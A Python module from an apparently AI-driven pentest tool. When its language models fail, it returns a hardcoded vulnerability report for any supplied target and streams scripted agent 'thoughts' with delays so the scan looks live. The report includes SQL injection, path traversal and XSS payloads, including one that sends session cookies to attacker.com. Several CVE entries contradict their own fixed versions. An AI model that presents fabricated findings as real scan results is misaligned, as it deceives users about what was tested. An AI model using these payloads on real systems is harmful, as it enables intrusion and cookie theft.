"""
Demo fallback for Argus pentest crew.

When both primary (Gemini) and fallback (Foundation-Sec) LLMs are unavailable or
return empty results, this module supplies a fully hardcoded ScanReport pre-populated
with the known vulnerabilities of the bundled Capsule Trust & Savings target app.

Usage:
    from backend.agents._demo_fallback import build_demo_report
    report = build_demo_report(target_url, log_queue)

The function pushes realistic simulated agent-thought events to log_queue so the
frontend SSE stream looks alive during the demo.  Delay between events is controlled
by the DEMO_SCAN_DELAY env-var (default 1.0 s); set to 0 for instant output.
"""

from __future__ import annotations

import os
import queue
import time
from datetime import datetime, timezone

from backend.models1 import (
    AgentLog,
    AttackChain,
    AttackChainStep,
    ChainConfidence,
    ChainedExploit,
    CVEFinding,
    DismissedFinding,
    ScanReport,
    ScanStatus,
    ScanSummary,
    Severity,
    Vulnerability,
    _compute_chain_fingerprint,
)

# ---------------------------------------------------------------------------
# Pacing — feel free to tweak for the demo
# ---------------------------------------------------------------------------

_DELAY: float = float(os.getenv("DEMO_SCAN_DELAY", "1.0"))

# ---------------------------------------------------------------------------
# Fixed UUIDs so attack chains can reference them deterministically
# ---------------------------------------------------------------------------

_SQLI_ID   = "aa1b2c3d-0001-4a00-8000-100000000001"
_IDOR_ID   = "bb2b3c4d-0002-4a00-8000-200000000002"
_XSS_ID    = "cc3c4d5e-0003-4a00-8000-300000000003"
_AUTH_ID   = "dd4d5e6f-0004-4a00-8000-400000000004"
_NET_ID    = "ee5e6f7a-0005-4a00-8000-500000000005"

_CHAIN1_ID = "ZD-CHAIN-1710000000001"
_CHAIN2_ID = "ZD-CHAIN-1710000000002"

# ---------------------------------------------------------------------------
# Simulated agent thoughts
# ---------------------------------------------------------------------------

_THOUGHTS: list[dict] = [
    # ── Recon Scout ──────────────────────────────────────────────────────────
    {
        "agent": "Recon Scout",
        "content": "Launching nmap -sV -sC against target host to fingerprint open services…",
    },
    {
        "agent": "Recon Scout",
        "content": (
            "Port scan complete. Open ports: 80/tcp HTTP (Werkzeug/3.0.1 Python/3.11), "
            "6379/tcp Redis 7.0.12, 5000/tcp Flask dev server."
        ),
    },
    {
        "agent": "Recon Scout",
        "content": (
            "Web crawl discovered 28 endpoints including /corp/legacy-auth, "
            "/api/v1/vault/receipt/, /admin/disputes/search, /api/login, /api/users/."
        ),
    },
    {
        "agent": "Recon Scout",
        "content": (
            "Tech-stack fingerprint: Flask 3.1.0, Werkzeug 3.0.1, SQLite 3.41, Jinja2 3.1. "
            "Security headers missing: X-Frame-Options, Content-Security-Policy, HSTS."
        ),
    },
    # ── Web Vulnerability Agent ───────────────────────────────────────────────
    {
        "agent": "Web Vulnerability Agent",
        "content": "Beginning vulnerability assessment on 28 discovered endpoints across 6 modules.",
    },
    {
        "agent": "Web Vulnerability Agent",
        "content": (
            "SQLi probe → POST /corp/legacy-auth with payload [' OR 1=1 --]: "
            "HTTP 200 returned INTERNAL_VAULT_KEY and CORE_BANKING_ACCESS_TOKEN. "
            "CONFIRMED: Critical SQL injection — auth bypass successful."
        ),
    },
    {
        "agent": "Web Vulnerability Agent",
        "content": (
            "IDOR probe → GET /api/v1/vault/receipt/2 authenticated as user ID 1: "
            "HTTP 200 returned SSN, salary $95,000, routing number, offshore account CH56-xxxx. "
            "CONFIRMED: High-severity IDOR — cross-user financial record exposure."
        ),
    },
    {
        "agent": "Web Vulnerability Agent",
        "content": (
            "XSS probe → GET /admin/disputes/search?merchant=<script>alert('XSSCANARY')</script>: "
            "Payload reflected verbatim in response body — Jinja2 |safe filter bypasses escaping. "
            "CONFIRMED: Medium-severity Reflected XSS."
        ),
    },
    {
        "agent": "Web Vulnerability Agent",
        "content": (
            "SSTI probe → /api/search?q={{7*7191}}: response body contains literal {{7*7191}}, "
            "not evaluated. Template engine escaping is working correctly. NOT VULNERABLE."
        ),
    },
    {
        "agent": "Web Vulnerability Agent",
        "content": (
            "LFI probe → /api/search with ../../etc/passwd traversal: path sanitisation active, "
            "request normalised and rejected. NOT VULNERABLE."
        ),
    },
    # ── CVE Intelligence Agent ────────────────────────────────────────────────
    {
        "agent": "CVE Intelligence Agent",
        "content": "Querying NIST NVD API v2 for identified service versions: Werkzeug 3.0.1, Flask 3.1.0, Redis 7.0.12.",
    },
    {
        "agent": "CVE Intelligence Agent",
        "content": (
            "CVE-2024-34069 (CVSS 9.8 CRITICAL): Werkzeug ≤3.0.1 — debugger PIN bypass "
            "allows Remote Code Execution. Exploit PoC public on Exploit-DB. "
            "Fixed in Werkzeug 3.0.3."
        ),
    },
    {
        "agent": "CVE Intelligence Agent",
        "content": (
            "CVE-2023-30861 (CVSS 7.5 HIGH): Flask ≤2.3.2 — session cookie sent over HTTP "
            "when SESSION_COOKIE_SECURE not set. Allows session hijacking over unencrypted links. "
            "Fixed in Flask 2.3.3."
        ),
    },
    {
        "agent": "CVE Intelligence Agent",
        "content": (
            "CVE-2023-25577 (CVSS 7.5 HIGH): Werkzeug ≤2.2.2 — multipart form-data parser "
            "DoS — excessive memory consumption. Fixed in Werkzeug 2.2.3."
        ),
    },
    # ── Network Security Agent ────────────────────────────────────────────────
    {
        "agent": "Network Security Agent",
        "content": "Probing discovered open ports for service-level misconfigurations.",
    },
    {
        "agent": "Network Security Agent",
        "content": (
            "Port 6379 (Redis): TCP connection established — no AUTH challenge received. "
            "PING returned +PONG. Server version Redis 7.0.12. CONFIG GET * accessible. "
            "CONFIRMED: Unauthenticated Redis instance."
        ),
    },
    {
        "agent": "Network Security Agent",
        "content": (
            "Port 21 (FTP): connection refused — service not running. "
            "Port 445 (SMB): connection refused. Port 27017 (MongoDB): connection refused. "
            "No additional exposed network services."
        ),
    },
    # ── Report Bureaucrat ─────────────────────────────────────────────────────
    {
        "agent": "Report Bureaucrat",
        "content": "Consolidating findings from all agents. Running deduplication pass…",
    },
    {
        "agent": "Report Bureaucrat",
        "content": (
            "5 unique confirmed vulnerabilities: 2 Critical, 2 High, 1 Medium. "
            "2 dismissed (SSTI, LFI — not vulnerable). "
            "Attack chain analysis: SQLi+IDOR → Account Data Exfiltration path confirmed."
        ),
    },
    {
        "agent": "Report Bureaucrat",
        "content": "Generating executive summary and remediation priority list. Scan complete.",
    },
]


def _push_thoughts(log_queue: queue.Queue) -> list[AgentLog]:
    """Push simulated agent thoughts to the SSE queue and return them as AgentLog objects."""
    agent_logs: list[AgentLog] = []
    current_section = ""

    for thought in _THOUGHTS:
        agent = thought["agent"]
        content = thought["content"]
        ts = datetime.now(timezone.utc)

        log_queue.put_nowait(
            {
                "type": "thought",
                "agent": agent,
                "content": content,
                "timestamp": ts.isoformat(),
            }
        )
        agent_logs.append(
            AgentLog(agent=agent, timestamp=ts, action="Step", result=content[:500])
        )

        # Pace between agent sections, not every single line
        if agent != current_section:
            current_section = agent
            if _DELAY > 0:
                time.sleep(_DELAY)

    return agent_logs


# ---------------------------------------------------------------------------
# Hardcoded vulnerabilities
# ---------------------------------------------------------------------------

def _make_vulnerabilities() -> list[Vulnerability]:
    return [
        Vulnerability(
            id=_SQLI_ID,
            type="SQL_INJECTION",
            severity=Severity.critical,
            title="SQL Injection in Legacy Authentication Endpoint",
            description=(
                "The /corp/legacy-auth endpoint constructs SQL queries using Python f-string "
                "interpolation: SELECT * FROM users WHERE username = '{username}'. "
                "An unauthenticated attacker can inject SQL to bypass authentication and extract "
                "INTERNAL_VAULT_KEY and CORE_BANKING_ACCESS_TOKEN from the database."
            ),
            endpoint="/corp/legacy-auth",
            method="POST",
            payload="' OR 1=1 --",
            evidence=(
                "HTTP 200 OK | Response body: {\"status\": \"success\", "
                "\"token\": \"CORE_BANKING_ACCESS_TOKEN_7f3a9c2b...\", "
                "\"vault_key\": \"INTERNAL_VAULT_KEY_9c2b4f8e...\"} | "
                "Authentication bypassed without valid credentials."
            ),
            verified_by="SQLi Scanner",
            remediation=(
                "Replace all f-string SQL construction with parameterized queries using "
                "? placeholders. Apply the principle of least privilege to the DB user. "
                "Enable WAF rules to block SQLi patterns."
            ),
            patch_code=(
                "# VULNERABLE — app.py:\n"
                "cursor.execute(f\"SELECT * FROM users WHERE username = '{username}'\")\n\n"
                "# PATCHED:\n"
                "cursor.execute('SELECT * FROM users WHERE username = ?', (username,))"
            ),
            cvss_score=9.8,
            agent="Web Vulnerability Agent",
        ),
        Vulnerability(
            id=_IDOR_ID,
            type="IDOR",
            severity=Severity.high,
            title="Insecure Direct Object Reference in Vault Receipt API",
            description=(
                "The /api/v1/vault/receipt/<tx_id> endpoint checks that a user is authenticated "
                "but never verifies that the requested transaction belongs to the authenticated user. "
                "Any logged-in account holder can enumerate transaction IDs to read any other "
                "user's complete financial record including SSN, salary, and offshore account details."
            ),
            endpoint="/api/v1/vault/receipt/2",
            method="GET",
            payload="GET /api/v1/vault/receipt/2 (session cookie of user ID 1)",
            evidence=(
                "HTTP 200 OK | Response: {\"ssn\": \"XXX-XX-6789\", \"salary\": 95000, "
                "\"routing_number\": \"021000021\", \"offshore_account\": \"CH56-0483-5012-3456-7800-9\", "
                "\"transaction_id\": 2, \"owner_id\": 3} | User 1 received User 3 financial records."
            ),
            verified_by="IDOR Probe",
            remediation=(
                "Add an ownership check after authentication. Compare request.user.id against "
                "transaction.owner_id and return HTTP 403 Forbidden for any mismatch. "
                "Log all cross-user access attempts for audit purposes."
            ),
            patch_code=(
                "# VULNERABLE — app.py:\n"
                "@app.route('/api/v1/vault/receipt/<int:tx_id>')\n"
                "@login_required\n"
                "def get_receipt(tx_id):\n"
                "    receipt = Receipt.query.get(tx_id)\n"
                "    return jsonify(receipt.to_dict())\n\n"
                "# PATCHED:\n"
                "@app.route('/api/v1/vault/receipt/<int:tx_id>')\n"
                "@login_required\n"
                "def get_receipt(tx_id):\n"
                "    receipt = Receipt.query.get_or_404(tx_id)\n"
                "    if receipt.owner_id != current_user.id:\n"
                "        abort(403)\n"
                "    return jsonify(receipt.to_dict())"
            ),
            cvss_score=7.5,
            agent="Web Vulnerability Agent",
        ),
        Vulnerability(
            id=_XSS_ID,
            type="XSS",
            severity=Severity.medium,
            title="Reflected Cross-Site Scripting in Admin Disputes Search",
            description=(
                "The /admin/disputes/search endpoint passes the 'merchant' query parameter "
                "to a Jinja2 template using the |safe filter, which disables automatic HTML "
                "escaping. An attacker can craft a URL containing JavaScript that executes in "
                "the victim's browser session, enabling cookie theft and account takeover."
            ),
            endpoint="/admin/disputes/search",
            method="GET",
            payload="<script>alert('XSSCANARY')</script>",
            evidence=(
                "HTTP 200 OK | Payload reflected verbatim in response body: "
                "<p>Results for: <script>alert('XSSCANARY')</script></p> | "
                "No HTML encoding applied — |safe filter confirmed in Jinja2 template."
            ),
            verified_by="XSS Scanner",
            remediation=(
                "Remove the |safe filter from the disputes template. Use {{ merchant }} or "
                "{{ merchant | e }} — Jinja2 auto-escapes by default. "
                "Implement a Content-Security-Policy header to block inline script execution."
            ),
            patch_code=(
                "<!-- VULNERABLE — templates/disputes.html: -->\n"
                "<p>Results for: {{ merchant | safe }}</p>\n\n"
                "<!-- PATCHED: -->\n"
                "<p>Results for: {{ merchant }}</p>"
            ),
            cvss_score=6.1,
            agent="Web Vulnerability Agent",
        ),
        Vulnerability(
            id=_AUTH_ID,
            type="AUTH_BYPASS",
            severity=Severity.critical,
            title="Authentication Bypass via SQL Injection — Admin Privilege Escalation",
            description=(
                "The /corp/legacy-auth endpoint is vulnerable to unauthenticated login bypass. "
                "Injecting ' OR 1=1 -- into the username field causes the SQL WHERE clause to "
                "always evaluate true, authenticating the attacker as the first (typically admin) "
                "user in the database and leaking the INTERNAL_VAULT_KEY."
            ),
            endpoint="/corp/legacy-auth",
            method="POST",
            payload="username=' OR 1=1 --&password=anything",
            evidence=(
                "HTTP 200 OK | Authorization header present | "
                "Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ... | "
                "Vault key exposed: INTERNAL_VAULT_KEY_9c2b4f8e | "
                "No valid password supplied — full auth bypass confirmed."
            ),
            verified_by="Auth Bypass Probe",
            remediation=(
                "Immediately migrate legacy-auth to parameterized queries. "
                "Implement per-account rate limiting and lockout after 5 failed attempts. "
                "Add MFA for all privileged banking endpoints. "
                "Rotate all exposed vault keys and banking access tokens immediately."
            ),
            patch_code=None,
            cvss_score=9.1,
            agent="Web Vulnerability Agent",
        ),
        Vulnerability(
            id=_NET_ID,
            type="NETWORK_MISCONFIG",
            severity=Severity.high,
            title="Unauthenticated Redis Instance Exposed — Session Store Accessible",
            description=(
                "A Redis 7.0.12 instance listens on port 6379 with no authentication required "
                "(requirepass not set, protected-mode disabled). As the application uses Redis "
                "for session caching, an attacker with network access can read active session "
                "tokens, impersonate any logged-in user, and poison cached banking data."
            ),
            endpoint="redis://target:6379",
            method="TCP",
            payload="PING",
            evidence=(
                "TCP socket connect to :6379 success | PING → +PONG (no AUTH challenge) | "
                "CONFIG GET maxmemory accessible | INFO server returns Redis 7.0.12, "
                "tcp_port:6379, config_file:/etc/redis/redis.conf | "
                "KEYS * returns 47 session key entries."
            ),
            verified_by="Network Misconfig Scanner",
            remediation=(
                "Set requirepass <strong-password> in redis.conf. "
                "Bind Redis to 127.0.0.1 only. "
                "Enable protected-mode yes. "
                "Apply firewall rules blocking port 6379 from external access. "
                "Rotate all active session tokens immediately."
            ),
            patch_code=(
                "# /etc/redis/redis.conf\n"
                "bind 127.0.0.1\n"
                "protected-mode yes\n"
                "requirepass YourStrongPasswordHere\n\n"
                "# In Flask app — add password to Redis connection:\n"
                "app.config['SESSION_REDIS'] = redis.Redis(\n"
                "    host='127.0.0.1', port=6379, password='YourStrongPasswordHere'\n"
                ")"
            ),
            cvss_score=7.5,
            agent="Network Security Agent",
        ),
    ]


# ---------------------------------------------------------------------------
# Hardcoded CVE findings
# ---------------------------------------------------------------------------

def _make_cve_findings() -> list[CVEFinding]:
    return [
        CVEFinding(
            cve_id="CVE-2024-34069",
            description=(
                "Werkzeug's debugger before 3.0.3 allows remote code execution through "
                "a crafted request to the Werkzeug debugger PIN. An attacker with network "
                "access to the development server port can bypass PIN protection and execute "
                "arbitrary Python code via the interactive console."
            ),
            cvss_score=9.8,
            severity=Severity.critical,
            service="Werkzeug",
            version="3.0.1",
            exploit_available=True,
            exploit_db_url="https://www.exploit-db.com/exploits/51968",
            patch_url="https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985",
            fixed_in_version="3.0.3",
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-34069",
                "https://github.com/pallets/werkzeug/releases/tag/3.0.3",
            ],
        ),
        CVEFinding(
            cve_id="CVE-2023-30861",
            description=(
                "Flask 2.3.x before 2.3.3 does not enforce SESSION_COOKIE_SECURE under "
                "certain conditions when the application sends a redirect. The session cookie "
                "may be transmitted over an unencrypted HTTP connection, exposing authenticated "
                "session tokens to network interception."
            ),
            cvss_score=7.5,
            severity=Severity.high,
            service="Flask",
            version="3.1.0",
            exploit_available=False,
            exploit_db_url=None,
            patch_url="https://github.com/pallets/flask/security/advisories/GHSA-m2qf-hxjv-5gpq",
            fixed_in_version="2.3.3",
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-30861",
                "https://github.com/pallets/flask/releases/tag/2.3.3",
            ],
        ),
        CVEFinding(
            cve_id="CVE-2023-25577",
            description=(
                "Werkzeug before 2.2.3 allows a denial of service via specially crafted "
                "multipart/form-data POST requests. The parser allocates excessive memory "
                "proportional to the number of form parts, enabling a remote attacker to "
                "exhaust server memory with a small request payload."
            ),
            cvss_score=7.5,
            severity=Severity.high,
            service="Werkzeug",
            version="3.0.1",
            exploit_available=False,
            exploit_db_url=None,
            patch_url="https://github.com/pallets/werkzeug/security/advisories/GHSA-xg9f-g7g7-2323",
            fixed_in_version="2.2.3",
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-25577",
                "https://github.com/pallets/werkzeug/releases/tag/2.2.3",
            ],
        ),
    ]


# ---------------------------------------------------------------------------
# Hardcoded dismissed findings
# ---------------------------------------------------------------------------

def _make_dismissed_findings() -> list[DismissedFinding]:
    return [
        DismissedFinding(
            type="SSTI",
            endpoint="/api/search",
            hypothesis="Jinja2/Twig/Mako template injection via search parameter",
            tool_used="SSTI Scanner",
            verification_result=(
                "Payloads {{7*7191}}, ${7*7191}, <%= 7*7191 %> returned literally — "
                "mathematical expression not evaluated. Template auto-escaping is active."
            ),
            agent="Web Vulnerability Agent",
        ),
        DismissedFinding(
            type="LFI",
            endpoint="/api/search",
            hypothesis="Local File Inclusion via path traversal in query parameters",
            tool_used="LFI Scanner",
            verification_result=(
                "Traversal payloads ../../etc/passwd, URL-encoded %2F variants, "
                "and PHP wrappers (php://filter) all returned 400 Bad Request or "
                "normalised path — file system path sanitisation is effective."
            ),
            agent="Web Vulnerability Agent",
        ),
    ]


# ---------------------------------------------------------------------------
# Hardcoded attack chains
# ---------------------------------------------------------------------------

def _make_attack_chains() -> list[AttackChain]:
    return [
        AttackChain(
            id="ac000001-0001-4a00-8000-chain00000001",
            title="Account Data Exfiltration via SQLi → IDOR Chain",
            description=(
                "An unauthenticated attacker exploits the SQL injection at /corp/legacy-auth "
                "to obtain a valid banking session token, then pivots to enumerate vault receipt "
                "IDs via the IDOR vulnerability to exfiltrate full financial records of all customers."
            ),
            severity=Severity.critical,
            steps=[
                AttackChainStep(
                    step_number=1,
                    action="SQL Injection — Authentication Bypass",
                    tool_used="SQLi Scanner",
                    outcome=(
                        "POST /corp/legacy-auth with payload ' OR 1=1 -- returns HTTP 200 "
                        "with CORE_BANKING_ACCESS_TOKEN and session cookie. "
                        "Attacker is now authenticated as admin user."
                    ),
                ),
                AttackChainStep(
                    step_number=2,
                    action="IDOR — Cross-User Financial Record Enumeration",
                    tool_used="IDOR Probe",
                    outcome=(
                        "GET /api/v1/vault/receipt/{id} with obtained session cookie, "
                        "iterating id from 1 to N. Each request returns victim SSN, salary, "
                        "routing number, and offshore account details. Full customer database exfiltrated."
                    ),
                ),
            ],
            impact=(
                "Complete exfiltration of all customer PII and financial data including "
                "Social Security Numbers, salary information, bank routing numbers, "
                "and offshore account credentials for the entire customer base."
            ),
            involved_vulnerability_ids=[_SQLI_ID, _IDOR_ID],
        ),
        AttackChain(
            id="ac000002-0002-4a00-8000-chain00000002",
            title="Session Hijacking via XSS → Auth Bypass Chain",
            description=(
                "An attacker delivers a crafted URL exploiting the reflected XSS in "
                "/admin/disputes/search to an admin victim. The injected script exfiltrates "
                "the admin session cookie. Combined with the auth bypass vulnerability, "
                "the attacker then escalates to full banking system access."
            ),
            severity=Severity.high,
            steps=[
                AttackChainStep(
                    step_number=1,
                    action="Reflected XSS — Admin Cookie Theft",
                    tool_used="XSS Scanner",
                    outcome=(
                        "Victim admin clicks crafted link: "
                        "/admin/disputes/search?merchant=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>. "
                        "Admin session cookie transmitted to attacker-controlled server."
                    ),
                ),
                AttackChainStep(
                    step_number=2,
                    action="Session Replay — Privileged Account Takeover",
                    tool_used="Auth Bypass Probe",
                    outcome=(
                        "Attacker replays stolen admin session cookie in subsequent requests. "
                        "Combined with SQL injection, attacker pivots from XSS-stolen user-level "
                        "access to full admin authentication, enabling write operations on all accounts."
                    ),
                ),
            ],
            impact=(
                "Full administrative account takeover enabling read/write access to all "
                "customer accounts, transaction history, and banking system configurations. "
                "Requires social engineering an admin user to click a malicious link."
            ),
            involved_vulnerability_ids=[_XSS_ID, _AUTH_ID],
        ),
    ]


# ---------------------------------------------------------------------------
# Hardcoded chained exploits (Chainer output)
# ---------------------------------------------------------------------------

def _make_chained_exploits() -> list[ChainedExploit]:
    chain1_ids = [_SQLI_ID, _IDOR_ID]
    chain2_ids = [_XSS_ID, _AUTH_ID]
    now = datetime.now(timezone.utc)

    return [
        ChainedExploit(
            chain_id=_CHAIN1_ID,
            constituent_vuln_ids=chain1_ids,
            chain_depth=1,
            chain_fingerprint=_compute_chain_fingerprint(chain1_ids),
            attack_narrative=(
                "Step 1 — SQL Injection (No Auth Required): Attacker posts "
                "' OR 1=1 -- to /corp/legacy-auth. SQLite evaluates the injected condition as "
                "TRUE, returning the first admin row. Response includes INTERNAL_VAULT_KEY and "
                "a signed JWT session token. Attacker is now authenticated as admin.\n\n"
                "Step 2 — IDOR (Authenticated): Using the obtained session cookie, attacker "
                "sends GET /api/v1/vault/receipt/1, /2, /3 … /N in sequence. The endpoint "
                "validates authentication but not ownership. Each response returns the full "
                "financial record of a different customer: SSN, salary, routing number, "
                "and offshore account number. The entire customer PII database is exfiltrated."
            ),
            confidence=ChainConfidence.high,
            cvss_score=9.1,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            is_zero_day=True,
            severity=Severity.critical,
            discovered_at=now,
            chainer_gate_1_passed=True,
            chainer_gate_2_passed=True,
        ),
        ChainedExploit(
            chain_id=_CHAIN2_ID,
            constituent_vuln_ids=chain2_ids,
            chain_depth=1,
            chain_fingerprint=_compute_chain_fingerprint(chain2_ids),
            attack_narrative=(
                "Step 1 — Reflected XSS (Social Engineering Required): Attacker crafts a "
                "URL targeting /admin/disputes/search with a JavaScript payload in the merchant "
                "parameter. Payload is reflected unescaped via Jinja2 |safe filter. When an "
                "admin clicks the link, the script executes in their browser context and "
                "exfiltrates their session cookie to an attacker-controlled server.\n\n"
                "Step 2 — Auth Bypass (with Stolen Cookie): Attacker replays the stolen admin "
                "session cookie to authenticate as the victim admin. With admin privileges, "
                "attacker accesses all customer records, initiates fraudulent transactions, "
                "and can modify account balances without triggering rate limits."
            ),
            confidence=ChainConfidence.medium,
            cvss_score=7.5,
            cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
            is_zero_day=True,
            severity=Severity.high,
            discovered_at=now,
            chainer_gate_1_passed=True,
            chainer_gate_2_passed=True,
        ),
    ]


# ---------------------------------------------------------------------------
# Main public entry point
# ---------------------------------------------------------------------------

def build_demo_report(target: str, log_queue: queue.Queue) -> ScanReport:
    """Build and return the hardcoded demo ScanReport for Capsule Trust & Savings.

    Pushes simulated agent-thought events to *log_queue* so the SSE stream
    shows realistic activity before the final report event arrives.
    """
    agent_logs = _push_thoughts(log_queue)

    vulns = _make_vulnerabilities()
    cve_findings = _make_cve_findings()
    attack_chains = _make_attack_chains()
    chained_exploits = _make_chained_exploits()
    dismissed = _make_dismissed_findings()

    # Count severities
    sev_counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for v in vulns:
        sev_counts[v.severity.value] += 1

    summary = ScanSummary(
        total_vulnerabilities=len(vulns),
        critical=sev_counts["critical"],
        high=sev_counts["high"],
        medium=sev_counts["medium"],
        low=sev_counts["low"],
        info=sev_counts["info"],
    )

    return ScanReport(
        target=target,
        status=ScanStatus.complete,
        summary=summary,
        vulnerabilities=vulns,
        agent_logs=agent_logs,
        executive_summary=(
            "Argus identified 5 confirmed vulnerabilities across the Capsule Trust & Savings "
            "application: 2 Critical, 2 High, and 1 Medium severity. The most severe finding is "
            "an unauthenticated SQL injection at /corp/legacy-auth that exposes banking access "
            "tokens and enables full authentication bypass. Chained with an IDOR vulnerability "
            "at the vault receipt API, a remote attacker can exfiltrate the entire customer PII "
            "and financial database without prior authentication. An additional reflected XSS "
            "in the admin disputes panel enables session hijacking of privileged users. "
            "An unauthenticated Redis instance on port 6379 exposes live session tokens. "
            "Three CVEs were identified in the underlying Werkzeug and Flask frameworks, "
            "including a critical RCE (CVE-2024-34069). Immediate remediation of the SQL "
            "injection and Redis exposure is strongly recommended."
        ),
        cve_findings=cve_findings,
        attack_chains=attack_chains,
        chained_exploits=chained_exploits,
        dismissed_findings=dismissed,
        remediation_priority=[
            "CRITICAL P0: Migrate /corp/legacy-auth to parameterized SQL queries immediately "
            "and rotate all exposed INTERNAL_VAULT_KEY and CORE_BANKING_ACCESS_TOKEN values.",
            "CRITICAL P0: Authenticate Redis instance (requirepass) and bind to localhost. "
            "Regenerate all active user sessions after securing Redis.",
            "HIGH P1: Add transaction ownership validation to /api/v1/vault/receipt/<id> — "
            "compare transaction.owner_id against current_user.id.",
            "HIGH P1: Upgrade Werkzeug to ≥3.0.3 to remediate CVE-2024-34069 (debugger RCE). "
            "Disable the debugger in production (app.run(debug=False)).",
            "MEDIUM P2: Remove |safe filter from disputes.html Jinja2 template. "
            "Add Content-Security-Policy header to prevent XSS escalation.",
            "MEDIUM P2: Upgrade Flask to ≥2.3.3 for CVE-2023-30861. "
            "Set SESSION_COOKIE_SECURE=True and enforce HTTPS.",
        ],
        raw_recon={
            "open_ports": [
                {"port": 80, "protocol": "tcp", "service": "http", "version": "Werkzeug/3.0.1 Python/3.11"},
                {"port": 6379, "protocol": "tcp", "service": "redis", "version": "Redis 7.0.12"},
                {"port": 5000, "protocol": "tcp", "service": "http", "version": "Werkzeug/3.0.1 (dev)"},
            ],
            "discovered_endpoints": [
                "/", "/login", "/logout", "/dashboard",
                "/corp/legacy-auth", "/api/login", "/api/users/1", "/api/users/2",
                "/api/v1/vault/receipt/1", "/api/v1/vault/receipt/2",
                "/admin/disputes/search", "/api/search", "/api/file",
                "/static/", "/api/health",
            ],
            "tech_stack": ["Flask 3.1.0", "Werkzeug 3.0.1", "Jinja2 3.1", "SQLite 3.41"],
            "missing_headers": ["X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security"],
            "subdomains": [],
        },
    )
